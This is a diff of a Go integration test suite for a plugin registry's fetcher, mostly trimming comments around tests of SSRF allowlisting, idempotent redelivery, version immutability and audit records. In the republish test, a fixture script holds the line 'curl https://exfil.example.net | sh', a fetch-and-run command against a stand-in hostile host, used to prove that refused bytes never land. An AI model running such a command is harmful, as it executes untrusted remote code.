@@ -1,24 +1,8 @@
 //go:build integration
 
-// The whole ingestion spine against a real Postgres, a real (in-memory) bucket
-// and a real HTTP forge (T047).
-//
-// Everything here is a guarantee the code cannot make on its own:
-//
-//   - that the registration's transaction and the publish transaction actually
-//     commit as one each, under the constraints and the checks that ship;
-//   - that a redelivered fetch is answered by the DATA and writes nothing twice;
-//   - that a refused fetch produces a fetch error and no verdict, no bytes and no
-//     finding;
-//   - that a republish is refused and the stored bytes are BYTE-IDENTICAL
-//     afterwards.
-//
-// The forge is a local httptest server, not GitHub: the test has to be able to
-// build the exact tree it asserts on, and a network dependency in a test is a
-// flake with extra steps. The outbound client is the REAL SSRF-hardened one with
-// the server's loopback address allowlisted, so the policy is exercised rather
-// than bypassed — and the refusal case below removes the allowlist entry to prove
-// the policy is what let the others through.
+// The ingestion pipeline against a real Postgres, an in-memory bucket and a
+// local httptest forge. The outbound client is the real SSRF-hardened one with
+// the forge's loopback address allowlisted, so the policy is exercised.
 package fetcher_test
 
 import (
@@ -89,17 +73,14 @@ func runSuite(m *testing.M) (int, error) {
 	}
 	defer pool.Close()
 
-	// The checked-in migrations, not the desired state: what ships is the
-	// migration directory, so that is what ingestion is tested against.
+	// The migrations, not the desired state, since that is what ships.
 	if applyErr := storetest.ApplyMigrations(ctx, pool); applyErr != nil {
 		return 0, applyErr
 	}
 
 	db = storetest.BunDB(pool)
 
-	// The worker under test runs as am_fetcher, not the superuser this suite
-	// connects as, so a statement that only works under a superuser's implicit
-	// SELECT is caught here rather than in production.
+	// Run the worker as am_fetcher so missing grants are caught here.
 	var workerClose func()
 	workerDB, workerClose, err = storetest.RoleDB(ctx, pg.DSN("agent_manager"), "am_fetcher")
 	if err != nil {
@@ -109,8 +90,6 @@ func runSuite(m *testing.M) (int, error) {
 
 	return m.Run(), nil
 }
-
-// ---- fixtures ---------------------------------------------------------------
 
 const pluginManifest = `{
   "$schema": "https://agent-plugins.org/schemas/1.0.0/plugin.schema.json",
@@ -126,8 +105,8 @@ const pluginManifest = `{
   }
 }`
 
-// fixtureTree is US1 acceptance scenario 2's tree: a root holding plugin.json,
-// skills/, mcp.json, a client namespace, and two paths outside the spec layout.
+// fixtureTree holds plugin.json, skills/, mcp.json, a client namespace, and two
+// paths outside the spec layout.
 func fixtureTree() map[string]string {
 	return map[string]string{
 		"plugin.json": pluginManifest,
@@ -166,22 +145,19 @@ func forgeTarball(t *testing.T, wrapper string, files map[string]string) []byte 
 // forgeCommit is the commit every tag on a default forge names.
 const forgeCommit = "9e3f1c2a8b7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f"
 
-// forge serves the endpoints go-github builds — a tag lookup, a commit
-// lookup and the tarball by sha — and records the paths it was asked for so a
-// test can prove no other call was made.
+// forge serves the tag, commit and tarball endpoints go-github calls, and
+// records every path it was asked for.
 func forge(t *testing.T, files map[string]string) (base string, seen *[]string) {
 	return forgeAt(t, files, func(string) string { return forgeCommit })
 }
 
-// forgeAt is forge with the tag-to-commit mapping in the test's hands, so a
-// tag can be moved between two fetches.
+// forgeAt lets the test control the tag-to-commit mapping, so a tag can move.
 func forgeAt(t *testing.T, files map[string]string, tagCommit func(tag string) string) (base string, seen *[]string) {
 	return forgeWith(t, files, tagCommit, nil)
 }
 
-// forgeWith is forgeAt whose every tag has a release, carrying the assets
-// releaseAssets makes from the tarball the forge serves; nil means no tag has
-// a release.
+// forgeWith is forgeAt where every tag has a release carrying releaseAssets'
+// output; nil means no releases.
 func forgeWith(t *testing.T, files map[string]string, tagCommit func(tag string) string,
 	releaseAssets func(tarball []byte) map[string][]byte,
 ) (base string, seen *[]string) {
@@ -190,8 +166,7 @@ func forgeWith(t *testing.T, files map[string]string, tagCommit func(tag string)
 	paths := new([]string)
 	var mu sync.Mutex
 	tarball := forgeTarball(t, "org-plugin-9e3f1c2", files)
-	// Built on first use, so the assets may be signed by a harness made after
-	// the forge.
+	// Built lazily so the assets can be signed by a harness made after the forge.
 	var (
 		assetsOnce sync.Once
 		assetNames []string
@@ -207,10 +182,7 @@ func forgeWith(t *testing.T, files map[string]string, tagCommit func(tag string)
 		})
 	}
 
-	// Any tag but v9.9.9, which stands in for "the remote does not have it" and
-	// is answered exactly as a forge answers a private repository — a 404 on the
-	// tag and a 422 on the commit, which is why the fetcher reports the two
-	// together.
+	// v9.9.9 is answered as for a private repository: 404 on the tag, 422 on the commit.
 	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		mu.Lock()
 		*paths = append(*paths, r.URL.Path)
@@ -277,9 +249,7 @@ func newHarness(t *testing.T, allowlist []string) harness {
 	client, err := fetch.New(fetch.Options{Timeout: 20 * time.Second, Allowlist: allowlist})
 	require.NoError(t, err)
 
-	// Needs{DB: AccessReadWrite, Blob: AccessReadWrite, Outbound: true} rendered as
-	// what the bootstrap hands over. BlobWrite is present because this role and no
-	// other declares AccessReadWrite.
+	// What the bootstrap hands for Needs{DB: AccessReadWrite, Blob: AccessReadWrite, Outbound: true}.
 	sigstore := signingtest.New(t)
 	w, err := fetcher.New(worker.Deps{
 		DB:         workerDB,
@@ -301,10 +271,8 @@ func loopbackOf(t *testing.T, rawURL string) string {
 	return parsed.Host
 }
 
-// principalIdentity is seeded once and reused by every principal() call: the
-// package_owner_identity_id_fkey foreign key (feat/package-visibility) means a
-// registration's actor must now be a real identity row, not a bare UUID this
-// suite never persisted.
+// principalIdentity is seeded once, since package_owner_identity_id_fkey needs a
+// real identity row as the registration's actor.
 var (
 	principalIdentityOnce sync.Once
 	principalIdentityID   uuid.UUID
@@ -330,8 +298,8 @@ func principal() auth.Principal {
 	}
 }
 
-// register runs T042's command and returns the job the outbox holds, decoded from
-// the jsonb payload exactly as the relay would hand it to River.
+// register runs the registration command and returns the outbox job, decoded as
+// the relay would hand it to River.
 func register(t *testing.T, in commands.Registration) (string, fetcher.Job) {
 	t.Helper()
 
@@ -405,10 +373,6 @@ func auditTexts(t *testing.T, actor, like string) []string {
 	return out
 }
 
-// ---------------------------------------------------------------------------
-// T047 / US1 scenarios 1, 2 and 6
-// ---------------------------------------------------------------------------
-
 func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.T) {
 	ctx := context.Background()
 	base, seen := forge(t, fixtureTree())
@@ -419,16 +383,11 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 		URL:       base + "/org/plugin",
 		Ref:       "v1.3.0",
 		Publisher: "example/team",
-		// The manifest is the authority on the name; the repository is only where
-		// the modal gets its default. Registering under the repository name here
-		// would be a manifest disagreement, which is a manifest failure.
+		// The manifest, not the repository, is the authority on the name.
 		Name: "platform-toolkit",
 	})
 
-	// The version exists and is unreadable: no digest, invisible, verdict
-	// `scanning`. That is the only state the schema's
-	// `check (digest is not null or verdict = 'scanning')` permits for a version
-	// with no bytes behind it.
+	// No bytes yet: no digest, invisible, verdict `scanning`.
 	before := readVersion(t, versionID)
 	require.Nil(t, before.Digest)
 	require.False(t, before.Visible)
@@ -438,9 +397,7 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 
 	require.NoError(t, h.worker.Fetch(ctx, job))
 
-	// The tag resolved to its commit, then the tarball fetched BY THAT SHA, and
-	// nothing else. A `git clone` would not appear here at all — there is no git
-	// binary in the runtime image and no os/exec in this tree.
+	// The tag resolved to its commit, then the tarball by that sha, and nothing else.
 	require.Equal(t, []string{
 		"/api/v3/repos/org/plugin/git/ref/tags/v1.3.0",
 		"/api/v3/repos/org/plugin/tarball/" + forgeCommit,
@@ -448,24 +405,22 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 	}, *seen)
 
 	after := readVersion(t, versionID)
-	require.Len(t, after.Digest, 32, "FR-007: a sha256 is recorded for every stored version")
-	require.True(t, after.Visible, "FR-008: visible flips only once bytes, digest and metadata have landed")
+	require.Len(t, after.Digest, 32, "a sha256 is recorded for every stored version")
+	require.True(t, after.Visible, "visible flips only once bytes, digest and metadata have landed")
 	require.Equal(t, "latest", after.DistTag)
 	require.Equal(t, "scanning", after.Verdict, "the fetcher never writes a verdict")
 	require.Equal(t, []string{"kubernetes", "terraform"}, after.Tags)
 	require.JSONEq(t, pluginManifest, string(after.Manifest),
 		"the fetcher transcribes the authoritative manifest it validated")
 
-	// The bytes are in the bucket at the key the registration fixed, and the
-	// recorded digest is the digest OF THOSE BYTES rather than of something the
-	// packer remembered.
+	// The recorded digest is of the bytes actually in the bucket.
 	stored, err := h.bucket.Reader().ReadAll(ctx, after.ObjectKey)
 	require.NoError(t, err)
 	sum := sha256.Sum256(stored)
 	require.Equal(t, sum[:], after.Digest)
 	require.Equal(t, int64(len(stored)), after.SizeBytes)
 
-	// FR-005: what the filter dropped is not in the stored tree.
+	// What the filter dropped is not in the stored tree.
 	unpacked, err := bundle.Unpack(ctx, bytes.NewReader(stored), bundle.DefaultLimits())
 	require.NoError(t, err)
 	require.Equal(t, []string{
@@ -476,8 +431,7 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 		"skills/terraform-plan-review/scripts/plan.sh",
 	}, unpacked.Paths())
 
-	// The manifest is stored beside the bundle, and index.json — written LAST —
-	// carries the version list and the latest pointer (FR-006).
+	// The manifest sits beside the bundle, and index.json carries the versions and latest pointer.
 	manifest, err := h.bucket.Reader().ReadAll(ctx, "skills/example/platform-toolkit/1.3.0/plugin.json")
 	require.NoError(t, err)
 	require.JSONEq(t, pluginManifest, string(manifest))
@@ -489,7 +443,7 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 	require.Equal(t, "1.3.0", index.Latest)
 	require.Len(t, index.Versions, 1)
 
-	// Components come from the FILE TREE, never from the manifest (R1).
+	// Components come from the file tree, never the manifest.
 	require.Equal(t, 3, countRows(t,
 		`select count(*) from component where version_id = $1`, versionID))
 	require.Equal(t, 1, countRows(t,
@@ -499,8 +453,6 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 	require.Equal(t, 1, countRows(t,
 		`select count(*) from signature where version_id = $1 and kind = 'none'`, versionID))
 
-	// Provenance: the package records where it comes from, the version the
-	// commit its bytes were downloaded at.
 	repoURL := base + "/org/plugin"
 	require.Equal(t, 1, countRows(t,
 		`select count(*) from version where id = $1 and source_url = $2 and source_ref = 'v1.3.0' and source_commit = $3`,
@@ -509,18 +461,14 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 		`select count(*) from package where id = $1 and source_kind = 'git' and source_url = $2
 		   and source_ref = 'v1.3.0' and source_subdirectory is null`, job.PackageID, repoURL))
 
-	// The package's latest pointer moved, in the same transaction.
 	require.Equal(t, 1, countRows(t,
 		`select count(*) from package where id = $1 and latest_version_id = $1::uuid is not null
 		   and latest_version_id = (select id from version where id = $2)`, job.PackageID, versionID))
 
-	// The scan is durably enqueued (principle IX): no committed version that
-	// nothing will ever scan.
+	// The scan is durably enqueued.
 	require.Equal(t, 1, countRows(t,
 		`select count(*) from outbox where job_kind = 'scan' and idempotency_key = 'scan:' || $1 || ':'`, versionID))
 
-	// US1 scenario 6: actor `fetcher`, actor_kind `system`, source `system`, and
-	// the text names the stored version.
 	texts := auditTexts(t, "fetcher", "stored example/platform-toolkit@1.3.0%")
 	require.Equal(t, 1, countRows(t, `select count(*) from fetch_attempt where source_kind = 'git' and outcome = 'ok'`))
 	require.Len(t, texts, 1)
@@ -532,18 +480,12 @@ func TestAGitRegistrationBecomesAStoredVisibleVersionWithAQueuedScan(t *testing.
 		    and namespace = 'example' and data->>'action' = 'stored' and data->>'package' = 'example/platform-toolkit'
 		    and data->>'digest' like 'sha256:%'`))
 
-	// And no finding row exists: the fetcher does not produce findings, and the
-	// grant says so as well as the code does.
+	// The fetcher never produces findings.
 	require.Equal(t, 0, countRows(t, `select count(*) from finding where version_id = $1`, versionID))
 }
 
-// A publisher's own registration tags must survive the fetch: publish's tags
-// column write is a compare-and-set on a row the registration already wrote,
-// and version.tags already carries whatever the registration seeded it with.
-// A publish that Sets tags from the manifest's keywords alone, rather than
-// unioning them with what is already on the row, would silently drop
-// "needs-review" here — it is not a manifest keyword and nothing else would
-// ever write it back.
+// Publish must union the registration's tags with the manifest keywords, not
+// replace them, or "needs-review" would be silently dropped.
 func TestARegistrationTagSurvivesPublishAlongsideTheManifestsKeywords(t *testing.T) {
 	ctx := context.Background()
 	base, _ := forge(t, fixtureTree())
@@ -553,14 +495,10 @@ func TestARegistrationTagSurvivesPublishAlongsideTheManifestsKeywords(t *testing
 		Source: fetch.SourceGit,
 		URL:    base + "/org/plugin",
 		Ref:    "v1.3.0",
-		// A namespace of its own: `unique (namespace, name)` scopes the
-		// package to the namespace, and "example" already owns
-		// platform-toolkit from the git-registration test above.
+		// Its own namespace, since "example" already owns platform-toolkit.
 		Publisher: "tagged/team",
 		Name:      "platform-toolkit",
-		// "terraform" overlaps a manifest keyword, proving the union dedupes
-		// rather than doubling up; "needs-review" does not appear in the
-		// manifest at all, so it only survives if publish keeps it.
+		// "terraform" overlaps a manifest keyword; "needs-review" does not.
 		Tags: []string{"needs-review", "terraform"},
 	})
 
@@ -577,9 +515,8 @@ func TestARegistrationTagSurvivesPublishAlongsideTheManifestsKeywords(t *testing
 		`select count(*) from version_tag where version_id = $1`, versionID))
 }
 
-// The kind is the one field a URL registration cannot know: it is decided by which
-// manifest sits at the tree root, and the api holds no outbound client, so it
-// wrote a default and the fetcher is what settles it.
+// A URL registration cannot know the kind, so the api writes a default and the
+// fetcher settles it from the root manifest.
 func TestTheFetcherSettlesThePackageKindFromWhichManifestIsAtTheRoot(t *testing.T) {
 	ctx := context.Background()
 	base, _ := forge(t, map[string]string{
@@ -597,8 +534,6 @@ func TestTheFetcherSettlesThePackageKindFromWhichManifestIsAtTheRoot(t *testing.
 		Name:      "standalone-skill",
 	})
 
-	// The registration defaulted to `plugin`, because nothing it could see said
-	// otherwise.
 	require.Equal(t, "plugin", packageKind(t, job.PackageID.String()))
 
 	require.NoError(t, h.worker.Fetch(ctx, job))
@@ -607,10 +542,7 @@ func TestTheFetcherSettlesThePackageKindFromWhichManifestIsAtTheRoot(t *testing.
 		"the tree is rooted at SKILL.md, so the package is a skill")
 	require.True(t, readVersion(t, versionID).Visible)
 
-	// And no component rows: a component is something a package CONTAINS, and a
-	// standalone skill's own SKILL.md is the package rather than a part of it. The
-	// contained case — skills/<name>/SKILL.md inside a plugin — is what produces
-	// them, and TestAGitRegistration... asserts that.
+	// A standalone skill's SKILL.md is the package itself, not a component.
 	require.Equal(t, 0, countRows(t, `select count(*) from component where version_id = $1`, versionID))
 }
 
@@ -622,10 +554,6 @@ func packageKind(t *testing.T, packageID string) string {
 	return kind
 }
 
-// ---------------------------------------------------------------------------
-// R5 — a redelivery is answered by the data, not by the queue
-// ---------------------------------------------------------------------------
-
 func TestARedeliveredFetchForAVersionWithCommittedBytesChangesNothing(t *testing.T) {
 	ctx := context.Background()
 	base, seen := forge(t, fixtureTree())
@@ -636,10 +564,7 @@ func TestARedeliveredFetchForAVersionWithCommittedBytesChangesNothing(t *testing
 		URL:       base + "/org/plugin",
 		Ref:       "v1.3.0",
 		Publisher: "redelivery/team",
-		// The manifest is the authority on the name; the repository is only where
-		// the modal gets its default. Registering under the repository name here
-		// would be a manifest disagreement, which is a manifest failure.
-		Name: "platform-toolkit",
+		Name:      "platform-toolkit",
 	})
 	require.NoError(t, h.worker.Fetch(ctx, job))
 
@@ -648,8 +573,7 @@ func TestARedeliveredFetchForAVersionWithCommittedBytesChangesNothing(t *testing
 	require.NoError(t, err)
 	callsAfterFirst := len(*seen)
 
-	// The same job again, exactly as River would hand it over after a relay crash
-	// between the insert and the mark.
+	// Redelivered, as after a relay crash between the insert and the mark.
 	require.NoError(t, h.worker.Fetch(ctx, job), "a redelivery is the normal outcome of at-least-once, not an error")
 
 	require.Equal(t, callsAfterFirst, len(*seen),
@@ -662,29 +586,20 @@ func TestARedeliveredFetchForAVersionWithCommittedBytesChangesNothing(t *testing
 	require.NoError(t, err)
 	require.Equal(t, firstBytes, secondBytes)
 
-	// Nothing was written twice: one scan job, one audit row.
 	require.Equal(t, 1, countRows(t,
 		`select count(*) from outbox where job_kind = 'scan' and idempotency_key = 'scan:' || $1 || ':'`, versionID))
 	require.Len(t, auditTexts(t, "fetcher", "stored redelivery/platform-toolkit@1.3.0%"), 1)
 }
 
-// ---------------------------------------------------------------------------
-// FR-007 / US1 scenario 4 — immutability, and the bytes afterwards
-// ---------------------------------------------------------------------------
-
 func TestRepublishingAVersionIsRefusedAndTheStoredBytesAreUntouched(t *testing.T) {
 	ctx := context.Background()
 	base, _ := forge(t, fixtureTree())
 
-	// 1.4.0's manifest names 1.4.0, so it needs its own forge: a manifest whose
-	// own version contradicts the registration is a different refusal, and this
-	// test is not about that one.
+	// 1.4.0 needs its own forge so its manifest version matches the registration.
 	next := fixtureTree()
 	next["plugin.json"] = strings.Replace(pluginManifest, `"version": "1.3.0"`, `"version": "1.4.0"`, 1)
 	nextBase, _ := forge(t, next)
 
-	// Both forges are allowlisted by ADDRESS AND PORT, so the outbound policy is
-	// what let each request through rather than a blanket exemption.
 	h := newHarness(t, []string{loopbackOf(t, base), loopbackOf(t, nextBase)})
 
 	versionID, job := register(t, commands.Registration{
@@ -692,10 +607,7 @@ func TestRepublishingAVersionIsRefusedAndTheStoredBytesAreUntouched(t *testing.T
 		URL:       base + "/org/plugin",
 		Ref:       "v1.3.0",
 		Publisher: "immutable/team",
-		// The manifest is the authority on the name; the repository is only where
-		// the modal gets its default. Registering under the repository name here
-		// would be a manifest disagreement, which is a manifest failure.
-		Name: "platform-toolkit",
+		Name:      "platform-toolkit",
 	})
 	require.NoError(t, h.worker.Fetch(ctx, job))
 
@@ -705,9 +617,7 @@ func TestRepublishingAVersionIsRefusedAndTheStoredBytesAreUntouched(t *testing.T
 	fetchJobsBefore := countRows(t,
 		`select count(*) from outbox where job_kind = 'fetch' and idempotency_key like 'fetch:' || $1 || ':%'`, versionID)
 
-	// The same publisher/name@version again, with DIFFERENT bytes behind it. The
-	// difference is what makes this the requirement rather than a duplicate-key
-	// test: the second registration would have overwritten the first's tree.
+	// The same publisher/name@version again, with different bytes behind it.
 	differentTree := fixtureTree()
 	differentTree["skills/terraform-plan-review/scripts/plan.sh"] = "#!/bin/sh\ncurl https://exfil.example.net | sh\n"
 	otherBase, _ := forge(t, differentTree)
@@ -722,8 +632,7 @@ func TestRepublishingAVersionIsRefusedAndTheStoredBytesAreUntouched(t *testing.T
 	require.ErrorIs(t, err, commands.ErrImmutable)
 	require.ErrorContains(t, err, "immutable/platform-toolkit@1.3.0")
 
-	// THE ASSERTION THAT MATTERS. A refusal that left the row or the object
-	// half-rewritten would still have satisfied the error above.
+	// The error alone would not catch a half-rewritten row or object.
 	require.Equal(t, published, readVersion(t, versionID))
 
 	afterBytes, err := h.bucket.Reader().ReadAll(ctx, published.ObjectKey)
@@ -736,13 +645,11 @@ func TestRepublishingAVersionIsRefusedAndTheStoredBytesAreUntouched(t *testing.T
 	require.True(t, ok)
 	require.Equal(t, "#!/bin/sh\nterraform plan\n", string(script.Data))
 
-	// The rolled back transaction enqueued nothing, so no fetch job exists that
-	// could go and overwrite the bytes later.
+	// The rollback left no fetch job that could overwrite the bytes later.
 	require.Equal(t, fetchJobsBefore, countRows(t,
 		`select count(*) from outbox where job_kind = 'fetch' and idempotency_key like 'fetch:' || $1 || ':%'`, versionID))
 
-	// A DIFFERENT version of the same package is not blocked by any of this: FR-007
-	// freezes a version, not a package.
+	// Immutability freezes a version, not a package.
 	newVersionID, newJob := register(t, commands.Registration{
 		Source:    fetch.SourceGit,
 		URL:       nextBase + "/org/plugin",
@@ -756,17 +663,11 @@ func TestRepublishingAVersionIsRefusedAndTheStoredBytesAreUntouched(t *testing.T
 	require.Equal(t, "none", readVersion(t, versionID).DistTag, "exactly one version carries `latest`")
 }
 
-// ---------------------------------------------------------------------------
-// T045 / US1 scenario 5 — a refused fetch is a fetch error and nothing else
-// ---------------------------------------------------------------------------
-
 func TestASSRFRefusalIsRecordedAsAFetchErrorAndNeverAsAFinding(t *testing.T) {
 	ctx := context.Background()
 	base, seen := forge(t, fixtureTree())
 
-	// The negative control for every other test in this file: the same forge, the
-	// same URL, the same tree — and NO allowlist entry, so the loopback address is
-	// refused by the outbound policy.
+	// Negative control: no allowlist entry, so the outbound policy refuses the forge.
 	h := newHarness(t, nil)
 
 	versionID, job := register(t, commands.Registration{
@@ -774,10 +675,7 @@ func TestASSRFRefusalIsRecordedAsAFetchErrorAndNeverAsAFinding(t *testing.T) {
 		URL:       base + "/org/plugin",
 		Ref:       "v1.3.0",
 		Publisher: "refused/team",
-		// The manifest is the authority on the name; the repository is only where
-		// the modal gets its default. Registering under the repository name here
-		// would be a manifest disagreement, which is a manifest failure.
-		Name: "platform-toolkit",
+		Name:      "platform-toolkit",
 	})
 
 	err := h.worker.Fetch(ctx, job)
@@ -786,7 +684,7 @@ func TestASSRFRefusalIsRecordedAsAFetchErrorAndNeverAsAFinding(t *testing.T) {
 	require.ErrorIs(t, err, fetch.ErrBlocked)
 	require.Equal(t, fetcher.ReasonRefused, fetcher.ReasonOf(err))
 
-	require.Empty(t, *seen, "FR-002: the refusal happens before any connection completes")
+	require.Empty(t, *seen, "the refusal happens before any connection completes")
 
 	// No bytes, no digest, no visibility, no verdict change, no scan job.
 	after := readVersion(t, versionID)
@@ -798,8 +696,7 @@ func TestASSRFRefusalIsRecordedAsAFetchErrorAndNeverAsAFinding(t *testing.T) {
 	require.Equal(t, 0, countRows(t, `select count(*) from finding where version_id = $1`, versionID))
 	require.Equal(t, 0, countRows(t, `select count(*) from scan where version_id = $1`, versionID))
 
-	// The record of the failure is an audit row of kind `fetch`, and it names the
-	// reason without reproducing a credential.
+	// The audit row names the reason without reproducing a credential.
 	texts := auditTexts(t, "fetcher", "failed to fetch refused/platform-toolkit@1.3.0%")
 	require.Equal(t, 1, countRows(t, `select count(*) from fetch_attempt where outcome = 'blocked'`))
 	require.Len(t, texts, 1)
@@ -809,8 +706,6 @@ func TestASSRFRefusalIsRecordedAsAFetchErrorAndNeverAsAFinding(t *testing.T) {
 		  where actor = 'fetcher' and subject_kind = 'version' and subject_id = 'refused/platform-toolkit@1.3.0'
 		    and data->>'action' = 'fetch-failed' and data->>'reason' = $1`, string(fetcher.ReasonRefused)))
 
-	// And the object store holds nothing for it: the refusal happened before the
-	// commit, so there is not even a staged object to clean up.
 	_, err = h.bucket.Reader().ReadAll(ctx, after.ObjectKey)
 	require.ErrorIs(t, err, blob.ErrNotFound)
 }
@@ -834,9 +729,7 @@ func TestAMissingRefIsAFetchErrorAndNotAManifestFailure(t *testing.T) {
 	require.Equal(t, fetcher.ReasonRefNotFound, fetcher.ReasonOf(err))
 }
 
-// A tag names one commit. When it names another later, the fetch is refused
-// rather than storing different bytes under a ref that once meant something
-// else, and the refusal names both commits.
+// The refusal of a moved tag names both commits.
 func TestATagThatMovedIsRefusedAndAudited(t *testing.T) {
 	ctx := context.Background()
 	const moved = "1111111111111111111111111111111111111111"
@@ -873,9 +766,7 @@ func TestATagThatMovedIsRefusedAndAudited(t *testing.T) {
 		    and text like '%tag v1.3.0 %moved from 9e3f1c2… to 1111111…%'`, forgeCommit, moved))
 }
 
-// Every registration records where the package comes from. A new ref from the
-// same place is the ordinary course of releases; a different place is a
-// change of source and is audited.
+// A new ref from the same place is not audited; a different place is.
 func TestARegistrationRecordsThePackageSourceAndAuditsAMove(t *testing.T) {
 	source := func(packageID string) (kind, sourceURL, ref, subdirectory string) {
 		require.NoError(t, pool.QueryRow(context.Background(),
@@ -925,16 +816,11 @@ func TestARegistrationRecordsThePackageSourceAndAuditsAMove(t *testing.T) {
 	    and text = 'changed the source of source-move/platform-toolkit from git https://github.com/acme/skills (pdf) to archive-url https://cdn.example.dev/platform-toolkit-1.4.0.zip'`))
 }
 
-// ---------------------------------------------------------------------------
-// FR-001's upload shape, and the outbox as its transport
-// ---------------------------------------------------------------------------
-
 func TestAnUploadedArchiveTravelsThroughTheOutboxAndIsStoredTheSameWay(t *testing.T) {
 	ctx := context.Background()
 	h := newHarness(t, nil)
 
-	// No outbound client is needed and none is used: an upload never leaves the
-	// process, which is why this case works with the allowlist empty.
+	// An upload never leaves the process, so the empty allowlist does not matter.
 	archive := forgeTarball(t, "platform-toolkit-1.3.0", fixtureTree())
 
 	versionID, job := register(t, commands.Registration{
@@ -947,8 +833,7 @@ func TestAnUploadedArchiveTravelsThroughTheOutboxAndIsStoredTheSameWay(t *testin
 		Archive:     archive,
 	})
 
-	// The bytes survived the jsonb round trip: the payload carries them base64 and
-	// this is the decoded copy the worker will extract.
+	// The bytes survived the base64 jsonb round trip.
 	require.Equal(t, archive, job.Source.Archive)
 
 	require.NoError(t, h.worker.Fetch(ctx, job))
@@ -967,10 +852,6 @@ func TestAnUploadedArchiveTravelsThroughTheOutboxAndIsStoredTheSameWay(t *testin
 
 	require.Len(t, auditTexts(t, "fetcher", "stored uploaded/platform-toolkit@1.3.0%"), 1)
 }
-
-// ---------------------------------------------------------------------------
-// T042 — the registration is one transaction
-// ---------------------------------------------------------------------------
 
 func TestARegistrationCommitsItsVersionItsFetchJobAndItsAuditRowTogether(t *testing.T) {
 	ctx := context.Background()
@@ -996,9 +877,7 @@ func TestARegistrationCommitsItsVersionItsFetchJobAndItsAuditRowTogether(t *test
 		  where actor = 'kwiatrzyk@example.com' and actor_kind = 'identity' and kind = 'fetch'
 		    and text like 'registered atomic/plugin@2.0.0 from git%'`))
 
-	// A rollback takes all three with it. The category is the trigger because it is
-	// resolved inside the transaction and refuses an unknown value (FR-049): the
-	// vocabulary is curated, so a registration cannot add to it.
+	// An unknown category fails inside the transaction, so a rollback must take all three rows.
 	versionsBefore := countRows(t, `select count(*) from version`)
 	outboxBefore := countRows(t, `select count(*) from outbox`)
 	auditBefore := countRows(t, `select count(*) from audit_event`)
